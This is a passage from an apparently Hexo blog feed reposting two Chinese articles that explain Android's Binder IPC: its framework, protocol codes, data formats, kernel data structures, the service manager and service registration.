<h2 id="3、安卓系统需要的是稳定的IPC机制"><a href="#3、安卓系统需要的是稳定的IPC机制" class="headerlink" title="3、安卓系统需要的是稳定的IPC机制"></a>3、安卓系统需要的是稳定的IPC机制</h2><p>数据传输形态（非共享内存）的 <code>IPC</code> 机制有两种形态：<code>byte stream</code> 和 <code>message-based</code> 。如果使用字节流形态的方式（例如 <code>PIPE</code> 或者 <code>socket</code> ），那么对于 <code>reader</code> 一侧，我们需要在内核构建一个 <code>ring buffer</code> ，把 <code>writer</code> 写入的数据拷贝到 <code>reader</code> 的这个环形缓冲区。而在 <code>reader</code> 一侧的，如何管理这个 <code>ring buffer</code> 是一个头疼的事情。因此 <code>binder</code> 采用了 <code>message-based</code> 的形态，并形成了如下的缓冲区管理方式：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-25-35.png" class="">

<p>需要进行 <code>Binder</code> 通信的两个进程传递结构化的 <code>message</code> 数据，根据 <code>message</code> 的大小在内核分配同样大小的 <code>binder</code> 缓冲区（从 <code>binder</code> 内存区中分配，内核用 <code>binder alloc</code> 对象来抽象），并完成用户空间到内核空间的拷贝。 <code>Binder server</code> 在用户态的程序直接可以访问到 <code>binder buffer</code> 中的 <code>message</code> 数据。</p>
<p>从内存管理的角度来看，这样的方案是一个稳定性比较高的方案。每个进程可以使用的 <code>binder</code> 内存是有限制的，一个进程不能使用超过 <code>1M</code> 的内存，杜绝了恶意 APP 无限制的通过 <code>IPC</code> 使用内存资源。此外，如果撰写 <code>APP</code> 的工程师不那么谨慎，有些传统的 <code>Linux IPC</code> 机制容易导致内存泄露，从而导致系统稳定性问题。同样的，如果对通信中的异常（例如 <code>server</code> 进程被杀掉）没有有良好的处理机制，也会造成稳定性问题。 <code>Binder</code> 通信机制提供了 <code>death-notification</code> 机制，优雅的处理了通信两端异常退出的异常，增强了系统的稳定性。</p>
<h2 id="4、安卓系统需要的是安全的IPC机制"><a href="#4、安卓系统需要的是安全的IPC机制" class="headerlink" title="4、安卓系统需要的是安全的IPC机制"></a>4、安卓系统需要的是安全的IPC机制</h2><p>从安全性（以及稳定性）的角度，各个安卓应用在自己的 <code>sandbox</code> 中运行并用一个系统唯一的 <code>id</code> 来标示该应用（ <code>uid</code> ）。由于 APP 和系统服务进程是完全隔离的，安卓设计了 <code>transaction-based</code> 的进程间通信机制： <code>binder</code> ， APP 通过 <code>binder</code> 请求系统服务。由于 <code>binder driver</code> 隔离了通信的两段进程。因此实际上在 <code>binder driver</code> 中是最好的一个嵌入安全检查的地方，具体可以参考下面的安全检查机制示意图：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-26-08.png" class="">

<p>安卓是一个开放的系统，因此安全性显得尤为重要。在安卓世界， <code>uid</code> 用来标示一个应用，在内核（而非用户空间）中附加 <code>UID/PID</code> 标识并在具体提供服务的进程端进行安全检查，主要体现在下面两个方面：</p>
<ol>
<li><p>系统提供了唯一的上下文管理者：<code>service manager</code> 并且只有信任的 <code>uid</code> 才能注册 <code>service</code> 组件。</p>
</li>
<li><p>系统把特定的资源权限赋权给 <code>Binder server</code> （ <code>service</code> 组件绑定的进程），当 <code>binder client</code> 请求服务的时候对 <code>uid</code> 进行安全检查。</p>
</li>
</ol>
<p>传统的 <code>IPC</code> 机制在内核态并不支持 <code>uid/pid</code> 的识别，通过上层的通信协议增加发起端的 <code>id</code> 并不安全，而且传统的 <code>IPC</code> 机制没有安全检查机制，这种情况下任何人都可以撰写恶意 APP 并通过 <code>IPC</code> 访问系统服务，获取用户隐私数据。</p>
<p>解决了 what 和 why 之后，我们后续的章节将主要讲述 <code>binder</code> 的软件框架和通信框架，在了解了蓝图之后，我们再深入到 <code>binder</code> 是如何在各种场景下工作的。随着 <code>binder</code> 场景解析，我们也顺便描述了 <code>binder</code> 驱动中的主要数据结构。</p>
<h1 id="三、Binder软件框架和通信框架"><a href="#三、Binder软件框架和通信框架" class="headerlink" title="三、Binder软件框架和通信框架"></a>三、Binder软件框架和通信框架</h1><h2 id="1、软件框架"><a href="#1、软件框架" class="headerlink" title="1、软件框架"></a>1、软件框架</h2><p>一个大概的软件结构如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-26-49.png" class="">

<p>所有的通信协议都是分层的， <code>binder</code> 也不例外，只不过简单一些。 <code>Binder</code> 通信主要有三层：应用层，<code>IPC</code> 层，内核层。如果使用 <code>Java</code> 写应用，那么 <code>IPC</code> 层次要更丰富一些，需要通过 <code>Java layer</code> 、 <code>jni</code> 和 <code>Native IPC layer</code> 完成所有的 <code>IPC</code> 通信过程。如果使用 <code>C++</code> 在 <code>Native</code> 层写应用，那么基本上 <code>BpBinder</code> 和 <code>BBinder</code> 这样的 <code>Native IPC</code> 机制就足够了，这时候，软件结构退化成（后续我们基本上是基于这个软件结构描述）：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-27-14.png" class="">

<p>对于应用层而言，互相通信的实体交互的是类似 <code>start activity</code> 、 <code>add service</code> 这样的应用相关的协议数据，通信双方并不知道底层实现，感觉它们之间是直接通信似得。而实际上，应用层数据是通过 <code>Native IPC</code> 层、 <code>kerenl</code> 层的封装，解析，映射完成了最后的通信过程。在 <code>Native IPC</code> 层， <code>BpBinder</code> 和 <code>BBinder</code> 之间通信之间的封包有自己的格式，<code>IPC header</code> 会标记通信的起点和终点（ <code>binder ref</code> 或者 <code>binder node</code> ）、通信类型等信息，而应用层数据只是 <code>IPC</code> 层的 <code>payload</code> 。同样的，表面上是 <code>BpBinder</code> 和 <code>BBinder</code> 两个实体在交互 <code>IPC</code> 数据，实际上需要底层 <code>binder driver</code> 提供通信支持。</p>
<h2 id="2、通信框架"><a href="#2、通信框架" class="headerlink" title="2、通信框架"></a>2、通信框架</h2><p>分别位于 <code>binder client</code> 和 <code>server</code> 中的应用层实体进行数据交互的过程交过 <code>transaction</code> ，当然，为了保证 <code>binder transaction</code> 能够正确、稳定的完成， <code>binder</code> 代理实体、 <code>binder</code> 实体以及 <code>binder driver</code> 之间需要进行非常复杂的操作，因此 <code>binder</code> 通信定义了若干的通信协议码，下面表格列出了几个常用的 <code>binder</code> 实体或者 <code>binder</code> 代理实体发向 <code>binder driver</code> 的通信协议码：</p>
<table>
<thead>
<tr>
<th>Binder command code</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>BC_TRANSACTION</code></td>
<td><code>Binder</code> 代理实体请求数据通信服务</td>
</tr>
<tr>
<td><code>BC_REPLY</code></td>
<td><code>Binder</code> 实体完成了服务请求的回应</td>
</tr>
<tr>
<td><code>BC_INCREFS</code> <code>BC_DECREFS</code></td>
<td>管理 <code>binder ref</code> 的引用计数</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
</tbody></table>
<p>下面的表格列出了几个常用的 <code>binder driver</code> 发向 <code>binder</code> 实体或者 <code>binder</code> 代理实体的通信协议码：</p>
<table>
<thead>
<tr>
<th>Binder response code</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>BR_TRANSACTION</code></td>
<td><code>Binder driver</code> 收到 <code>transaction</code> 请求，将其转发给 <code>binder</code> 实体对象</td>
</tr>
<tr>
<td><code>BR_REPLY</code></td>
<td><code>Binder driver</code> 通知 <code>binder</code> 代理实体， <code>server</code> 端已经完成服务请求，返回结果。</td>
</tr>
<tr>
<td><code>BR_TRANSACTION_COMPLETE</code></td>
<td><code>Binder driver</code> 通知 <code>binder</code> 代理实体，它发出的 <code>transaction</code> 请求已经收到。或者 <code>Binder driver</code> 通知 <code>binder</code> 实体，它发出的 <code>transaction reply</code> 已经收到。</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
</tbody></table>
<p><code>Binder</code> 通信的形态很多种，有些只涉及 <code>binder server</code> 中的实体对象和 <code>binder driver</code> 的交互。例如： <code>BC_REGISTER_LOOPER</code> 。不过使用最多、过程最复杂的还是传递应用数据的 <code>binder transaction</code> 过程，具体如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-30-20.png" class="">


<p><code>Binder client</code> 和 <code>server</code> 之间的进程间通信实际上是通过 <code>binder driver</code> 中转的。在这样的通信框架中，<code>client/server</code> 向 <code>binder driver</code> 发送 <code>transaction/reply</code> 是直接通过 <code>ioctl</code> 完成的，而相反的方向， <code>binder driver</code> 向 <code>client/server</code> 发送的 <code>transaction/reply</code> 则有些复杂，毕竟在用户空间的 <code>client/server</code> 不可能不断的轮询接收数据。正因为如此，在 <code>binder</code> 通信中有了 <code>binder work</code> 的概念，具体的方式如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-30-56.png" class="">

<p>对于 <code>binder transaction</code> 这个场景， <code>Binder work</code> 对象是嵌入在 <code>transaction</code> 对象内的， <code>binder driver</code> 在把 <code>transaction</code> （服务请求）送达到 <code>target</code> 的时候需要做两个动作：</p>
<ol>
<li><p>选择一个合适的 <code>binder work</code> 链表把本 <code>transaction</code> 相关的 <code>work</code> 挂入链表。</p>
</li>
<li><p>唤醒 <code>target process</code> 或者 <code>target thread</code> 。</p>
</li>
</ol>
<p>对于异步 <code>binder</code> 通信， <code>work</code> 是挂入 <code>binder node</code> 对应的 <code>work</code> 链表。如果是同步 <code>binder</code> 通信，那么要看是否能够找到空闲的 <code>binder thread</code> ，如果找到那么挂入线程的 <code>work todo list</code> ，否则挂入 <code>binder process</code> 的链表。</p>
<h2 id="3、应用层通信数据格式"><a href="#3、应用层通信数据格式" class="headerlink" title="3、应用层通信数据格式"></a>3、应用层通信数据格式</h2><p>本身应用层的数据应该是通信两端的实体自己的事情，不过由于需要交互 <code>binder</code> 实体对象信息，因此这里也简单描述其数据格式，如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-31-40.png" class="">

<p><code>Binder Client</code> 和 <code>server</code> 之间通信的基本单元是 应用层的数据 + 相关的 <code>binder</code> 实体对象数据 ，这个基本的单元可以是 1 个或者多个。为了区分开各个基本的单元，在应用层数据缓冲区的尾部有一个数组保存了各个 <code>binder</code> 实体对象的位置。每一个 <code>binder</code> 实体用 <code>flat_binder_object</code> 来抽象，主要的成员包括：</p>
<table>
<thead>
<tr>
<th>成员</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>header</td>
<td>说明该 binder 实体的类型，可能的类型包括：本地 binder 实体对象、远端 binder 实体对象（ handle ）、文件描述符</td>
</tr>
<tr>
<td>binder_uintptr_t binder</td>
<td>描述本地 binder 实体对象</td>
</tr>
<tr>
<td>__u32 handle</td>
<td>描述远端 binder 实体对象</td>
</tr>
<tr>
<td>binder_uintptr_t cookie</td>
<td>描述本地 binder 实体对象</td>
</tr>
</tbody></table>
<p>我们这里可以举一个简单的例子：假设我们写了一个 APP ，实现了一个 xxx 服务组件，在向 <code>service manager</code> 注册的时候就需要发起一次 <code>transaction</code> ，这时候缓冲区的数据就包括了上面图片中的应用层数据和一个 xxx 服务组件对应的 <code>binder</code> 实体对象。这时候应用层数据中会包括 <code>xxx service</code> 这样的字符串信息，这是方便其他 <code>client</code> 可以通过这个字符串来寻址到本 <code>service</code> 组件必须要的信息。除了应用层数据之外，还需要传递 <code>xxx service</code> 组件对应的 <code>binder</code> 实体。上面的例子说的是注册 <code>service</code> 组件的场景，因此传递的是本地 <code>binder</code> 实体对象。如果场景切换成 <code>client</code> 端申请服务的场景，这时候没有本地对象，因此需要传递的是远端的 <code>binder</code> 实体对象，即 <code>handle</code> 。因此 <code>flat_binder_object</code> 描述的是 <code>transaction</code> 相关的 <code>binder</code> 实体对象，可能是本地的，也可能是远端的。</p>
<h2 id="4、Binder帧数据格式"><a href="#4、Binder帧数据格式" class="headerlink" title="4、Binder帧数据格式"></a>4、Binder帧数据格式</h2><p><code>Binder IPC</code> 层的数据格式如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-34-35.png" class="">

<p><code>Binder IPC</code> 层看到的帧数据单元是 协议码 + 协议码数据 ，一个完整的帧数据是由一个或者多个帧数据单元组成。协议码区域就是上文中描述的 <code>BC_XXX</code> 和 <code>BR_XXX</code> ，不同的协议码有不同的协议码数据，同样的我们采用 <code>binder transaction</code> 为例说明协议码数据区域。 <code>BR_TRANSACTION</code> 、 <code>BR_REPLY</code> 、 <code>BC_TRANSACTION</code> 和 <code>BC_REPLY</code> 这四个协议码的数据都是 <code>binder_transaction_data</code> ，和应用层的数据关系如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E6%A1%86%E6%9E%B6%E7%AF%87%EF%BC%89/2020-08-24-12-35-03.png" class="">

<p><code>Binder transaction</code> 信息包括：本次通信的目的地、<code>sender pid</code> 和 <code>uid</code> 等通用信息，此外还有一些成员描述应用层的数据 <code>buffer</code> 信息，具体大家可以参考源代码。顺便提一句的是这里的 <code>sender pid</code> 和 <code>uid</code> 都是内核态的 <code>binder driver</code> 附加的，用户态的程序无法自己标记，从而保证了通信的安全性。</p>
<p>了解了整体框架之后，我们后面的章节将进入细节，通过几个典型 <code>binder</code> 通信场景的分析来加强对 <code>binder</code> 通信的理解，这些将在下篇文档中呈现，敬请期待！</p>
<p>参考文献：</p>
<p>1.Android系统源代码情景分析，罗升阳著</p>
<p>2.<a href="http://gityuan.com/tags/#binder">http://gityuan.com/tags/#binder</a> ，袁辉辉的博客</p>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android源码阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>Binder从入门到放弃（细节篇）</title>
    <url>/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>转载：<a href="https://blog.csdn.net/feelabclihu/article/details/105534146">https://blog.csdn.net/feelabclihu/article/details/105534146</a></p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Binder</code> 从入门到放弃包括了上下篇，上篇是框架部分，下篇通过几个典型的 <code>binder</code> 通信过程来呈现其实现细节，即本文。</p>
<h1 id="一、启动-service-manager"><a href="#一、启动-service-manager" class="headerlink" title="一、启动 service manager"></a>一、启动 service manager</h1><h2 id="1-流程"><a href="#1-流程" class="headerlink" title="1. 流程"></a>1. 流程</h2><p><code>Service manager</code> 进程和 <code>binder</code> 驱动的交互如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-39-43.png" class="">

<p>在安卓系统启动过程中， <code>init</code> 进程会启动 <code>service manager</code> 进程。<code>service manager</code> 会打开 <code>/dev/binder</code> 设备，一个进程打开 <code>binder</code> 设备就意味着该进程会使用 <code>binder</code> 这种 <code>IPC</code> 机制，这时候在内核态会相应的构建一个 <code>binder proc</code> 对象，来管理该进程相关的 <code>binder</code> 资源（ <code>binder ref</code> 、 <code>binder node</code> 、 <code>binder thread</code> 等）。为了方便 <code>binder</code> 内存管控，这时候还会映射一段 128K 的内存地址用于 <code>binder</code> 通信。之后 <code>service manager</code> 会把自己设定为 <code>context manager</code> 。所谓 <code>context manager</code> 实际上就是一个“名字服务器”，可以完成 <code>service</code> 组件名字的解析。随后 <code>service manager </code>会通过 <code>binder</code> 协议（ <code>BC_ENTER_LOOPER</code> ）告知驱动自己已经准备好接收请求了。最后 <code>service manager</code> 会进入读阻塞状态，等待来自其他进程的服务请求。</p>
<p>完成上面的一系列操作之后，内核相关的数据结构如下所示：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-40-15.png" class="">

<p>由于 <code>Service manager</code> 也算是一个特殊的 <code>service</code> 组件，因此在内核态也有一个 <code>binder node</code> 对象与之对应。 <code>service manager</code> 和其他的 <code>service</code> 组件不同的是它没有使用线程池模型，而是一个单线程的进程，因此它在内核态只有一个 <code>binder proc</code> 和 <code>binder thread</code> 。整个系统系统只有一个 <code>binder context</code> ，系统中所有的 <code>binder proc</code> 都指向这个全局唯一的 <code>binder</code> 上下文对象。而找到了 <code>binder context</code> 也就找到了 <code>service manager</code> 对应的 <code>binder node</code> 。</p>
<p><code>binder proc</code> 使用了红黑树来管理其所属的 <code>binder thread</code> 和 <code>binder node</code> ，不过在 <code>Service manager</code> 这个场景中， <code>binder proc</code> 只管理了一个 <code>binder thread</code> 和 <code>binder node</code> ，看起来似乎有些小题大做，不过在其他场景（例如 <code>system server</code> ）中，<code>binder proc</code> 会创建线程池，也可能注册多个 <code>service</code> 组件。</p>
<h2 id="2-相关数据结构"><a href="#2-相关数据结构" class="headerlink" title="2. 相关数据结构"></a>2. 相关数据结构</h2><p>在内核态，每一个参与 <code>binder</code> 通信的进程都会用一个唯一的 <code>struct binder_proc</code> 对象来表示。 <code>struct binder_proc</code> 主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>struct hlist_node proc_node</td>
<td>系统中的所有 binder proc 挂入 binder_procs 的链表中，这个成员是挂入全局 binder_procs 的链表的节点</td>
</tr>
<tr>
<td>struct rb_root threads</td>
<td>binder 进程对应的所有 binder thread 组成的红黑树， tid 作为 key</td>
</tr>
<tr>
<td>struct rb_root nodes</td>
<td>一个 binder 进程可以注册多个 service 组件，因此 binder proc 可以有很多的 binder node 。 Binder proc 对应的所有 binder node 组成一颗红黑树。当然对于 service manager 而言，它只有一个 binder node 。</td>
</tr>
<tr>
<td>struct list_head waiting_threads</td>
<td>该 binder 进程的线程池中等待处理 binder work 的 binder thread 链表</td>
</tr>
<tr>
<td>int pid</td>
<td>进程 ID</td>
</tr>
<tr>
<td>struct task_struct *tsk</td>
<td>指向该 binder 进程对应的进程描述符（指向 thread group leader 对应的 task struct ）</td>
</tr>
<tr>
<td>struct list_head todo</td>
<td>需要该 binder 进程处理的 binder work 链表</td>
</tr>
<tr>
<td>int max_threads</td>
<td>线程池中运行的最大数目</td>
</tr>
<tr>
<td>struct binder_alloc alloc</td>
<td>管理 binder 内存分配的数据结构</td>
</tr>
<tr>
<td>struct binder_context *context</td>
<td>保存 binder 上下文管理者的信息。通过 binder context 可以找到 service manager 对应的 bind node 。</td>
</tr>
</tbody></table>
<p>和进程抽象类似，<code>binder proc</code> 也是管理 <code>binder</code> 资源的实体，但是真正执行 <code>binder</code> 通信的实体是 <code>binder thread</code> 。<code>struct binder_thread</code> 主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>struct binder_proc *proc</td>
<td>该 binder thread 所属的 binder proc</td>
</tr>
<tr>
<td>struct rb_node rb_node</td>
<td>挂入 binder proc 红黑树的节点</td>
</tr>
<tr>
<td>struct list_head waiting_thread_node</td>
<td>无事可做的时候， binder thread 会挂入 binder proc 的等待队列</td>
</tr>
<tr>
<td>int pid</td>
<td>Thread id</td>
</tr>
<tr>
<td>struct binder_transaction *transaction_stack</td>
<td>该 binder thread 正在处理的transaction</td>
</tr>
<tr>
<td>struct list_head todo</td>
<td>需要该 binder 线程处理的 binder work 链表</td>
</tr>
<tr>
<td>struct task_struct *task</td>
<td>该 binder thread 对应的进程描述符</td>
</tr>
</tbody></table>
<p><code>Binder node</code> 是用户空间 <code>service</code> 组件对象的内核态实体对象， <code>struct binder_node</code> 主要成员如下表所示：</p>
<table>
<thead>
<tr>
<th>成员变量</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>struct rb_node rb_node;</td>
<td>一个 binder proc 可能有多个 service 组件（提供多种服务），属于一个 binder proc 的 binder node 会挂入 binder proc 的红黑树，这个成员是嵌入红黑树的节点。</td>
</tr>
<tr>
<td>struct binder_proc *proc</td>
<td>该 binder node 所属的 binder proc</td>
</tr>
<tr>
<td>int debug_id</td>
<td>唯一标示该 node 的 id ，用于调试</td>
</tr>
<tr>
<td>struct hlist_head refs</td>
<td>一个 service 组件可能会有多个 client 发起服务请求，也就是说每一个 client 都是对 binder node 的一次引用，这个成员是就是保存 binder ref 的哈希表</td>
</tr>
<tr>
<td>binder_uintptr_t ptr </br>binder_uintptr_t cookie</td>
<td>指向用户空间 service 组件相关的信息</td>
</tr>
<tr>
<td>u8 sched_policy:2; </br>u8 inherit_rt:1; </br>u8 min_priority;</td>
<td>这些属性定义了该 service 组件在处理 transaction 的时候优先级的设定。</td>
</tr>
<tr>
<td>bool has_async_transaction</td>
<td>是否有异步通信需要处理</td>
</tr>
<tr>
<td>struct list_head async_todo</td>
<td>异步 binder 通信的队列</td>
</tr>
</tbody></table>
<h1 id="二、client-如何找到-service-manager-？"><a href="#二、client-如何找到-service-manager-？" class="headerlink" title="二、client 如何找到 service manager ？"></a>二、client 如何找到 service manager ？</h1><h2 id="1、流程"><a href="#1、流程" class="headerlink" title="1、流程"></a>1、流程</h2><p>为了完成 <code>service</code> 组件注册， <code>Client</code> 需要首先定位 <code>service manager</code> 组件。在 <code>client</code> 这个 <code>binder process</code> 中，我们使用 <code>handle</code> 作为地址来标记 <code>service</code> 组件。<code>Service manager</code> 比较特殊，对任何一个 <code>binder process</code> 而言， <code>handle</code> 等于 0 的那个句柄就是指向 <code>service manager</code> 组件。对内核态 <code>binder</code> 驱动而言，寻找 <code>service manager</code> 实际上就是寻找其对应的 <code>binder node</code> 。下面是一个 <code>binder client</code> 向 <code>service manager</code> 请求注册服务的过程示例，我们重点关注 <code>binder</code> 驱动如何定位 <code>service manager</code> ：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-46-02.png" class="">

<p>想要访问 <code>service manager</code> 的进程需要首先打开 <code>binder driver</code> ，这时候内核会创建该进程对应的 <code>binder proc</code> 对象，并建立 <code>binder proc</code> 和 <code>context manager</code> 的关系，这样进一步可以找到 <code>service manager</code> 对应的 <code>binder node</code> 。随后， <code>client</code> 进程会调用 <code>mmap</code> 映射了（ 1M-8K ）的 <code>binder</code> 内存空间。之所以映射这么怪异的内存 <code>size</code> 主要是为了有效的利用虚拟地址空间（ <code>VMA</code> 之间有 4K 的 <code>gap</code> ）。完成上面两步操作之后，<code>client process</code> 就可以通过 <code>ioctl</code> 向 <code>service manager</code> 发起 <code>transaction</code> 请求了，同时告知目标对象 <code>handle</code> 等于 0 。</p>
<p>实际上这个阶段的主要工作在用户空间，主要是 <code>service manager</code> 组件代理 <code>BpServiceManager</code> 以及 <code>BpBinder</code> 的创建过程。一般的通信过程需要为组件代理对象分配一个句柄，但是 <code>service manager</code> 访问比较特殊，对于每一个进程，等于 0 的句柄都保留给了 <code>service manager</code> ，因此这里就不需要分配句柄这个过程了。</p>
<h2 id="2、路由过程"><a href="#2、路由过程" class="headerlink" title="2、路由过程"></a>2、路由过程</h2><p>在 <code>binder C/S</code> 通信结构中， <code>binder client</code> 中的 <code>BpBinder</code> 找到 <code>binder server</code> 中的 <code>BBinder</code> 的过程需要如下过程：</p>
<ol>
<li><p><code>binder client</code> 用户空间中的 <code>service</code> 组件代理（ <code>BpBinder</code> ）用句柄表示要访问的 <code>server</code> 中的 <code>service</code> 组件（ <code>BBinder</code> ）。</p>
</li>
<li><p>对于每一个句柄， <code>binder client</code> 内核空间使用 <code>binder ref</code> 对象与之对应。</p>
</li>
<li><p><code>binder ref</code> 对象会指向一个 <code>binder node</code> 对象。</p>
</li>
<li><p><code>binder node</code> 对象对应一个 <code>binder server</code> 进程的 <code>service</code> 组件。</p>
</li>
</ol>
<p>在我们这个场景中， <code>binder ref</code> 是在 <code>client</code> 第一次通过 <code>ioctl</code> 和 <code>binder</code> 驱动交互时候完成的。这时候 <code>binder</code> 驱动的 <code>binder_ioctl</code> 函数中会建立上面路由过程需要的完整的数据对象：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-46-47.png" class="">

<p><code>Service manager</code> 的路由比较特殊，没有采用 <code>binder ref---&gt;binder node</code> 的过程。在 <code>binder</code> 驱动中，看到 0 号句柄自然就知道是去往 <code>service manager</code> 的请求。因此，通过 <code>binder proc---&gt;binder context-----binder node</code> 这条路径就找到了 <code>service manager</code> 。</p>
<h1 id="三、注册-Service-组件"><a href="#三、注册-Service-组件" class="headerlink" title="三、注册 Service 组件"></a>三、注册 Service 组件</h1><h2 id="1-流程-1"><a href="#1-流程-1" class="headerlink" title="1. 流程"></a>1. 流程</h2><p>上一节描述了 <code>client</code> 如何找到 <code>service manager</code> 的过程，这是整个注册 <code>service</code> 组件的前半部分，这一节我们补全整个流程。由于 <code>client</code> 和 <code>service manager</code> 都完成了 <code>open</code> 和 <code>mmap</code> 的过程，双方都准备好，后续可以通过 <code>ioctl</code> 进行 <code>binder transaction</code> 的通信过程了，因此下面的流程图主要呈现 <code>binder transaction</code> 的流程（忽略 <code>client/server</code> 和 <code>binder</code> 驱动系统调用的细节）：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-47-20.png" class="">

<p><code>Service manager</code> 是一个 <code>service</code> 组件管理中心，任何一个 <code>service</code> 组件都需要向 <code>service manager</code> 进行注册（ <code>add service</code> ），以便其他的 APP 可以通过 <code>service manager</code> 定位到该 <code>service</code> 组件（ <code>check service</code> ）。</p>
<h2 id="2、数据对象综述"><a href="#2、数据对象综述" class="headerlink" title="2、数据对象综述"></a>2、数据对象综述</h2><p>注册服务相关数据结构全图如下：</p>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-47-55.png" class="">

<p>配合上面的流程， <code>binder</code> 驱动会为 <code>client</code> 和 <code>server</code> 分别创建对应的各种数据结构对象，具体过程如下：</p>
<ol>
<li><p>假设我们现在准备注册 A 服务组件，绑定 A 服务组件的进程在 <code>add service</code> 这个场景下是 <code>client process</code> ，它在用户空间首先会创建了 <code>service</code> 组件对象，在递交 <code>BC_TRANSACTION</code> 的时候会携带 <code>service</code> 组件的信息（把 <code>service</code> 组件地址信息封装在 <code>flat_binder_object</code> 数据结构中）。</p>
</li>
<li><p>在系统调用接口层面，我们使用 <code>ioctl</code> （ <code>BINDER_WRITE_READ</code> ）来完成具体 <code>transaction</code> 的递交过程。具体的 <code>transaction</code> 数据封装在 <code>struct binder_write_read</code> 对象中，具体如下图所示：</p>
</li>
</ol>
<img src="/2020/08/24/Binder%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%EF%BC%88%E7%BB%86%E8%8A%82%E7%AF%87%EF%BC%89/2020-08-24-12-48-16.png" class="">

<ol>
<li><p><code>Binder</code> 驱动创建 <code>binder_transaction</code> 对象来控制完成本次 <code>binder transaction</code> 。首先要初始化 <code>transaction</code> ，具体包括：和谁通信（用户空间通过 <code>binder_transaction_data</code> 的 <code>target</code> 成员告知 <code>binder</code> 驱动 <code>transaction</code> 的 <code>target</code> ）、为何通信（ <code>binder_transaction_data</code> 的 <code>code</code> ）等</p>
</li>
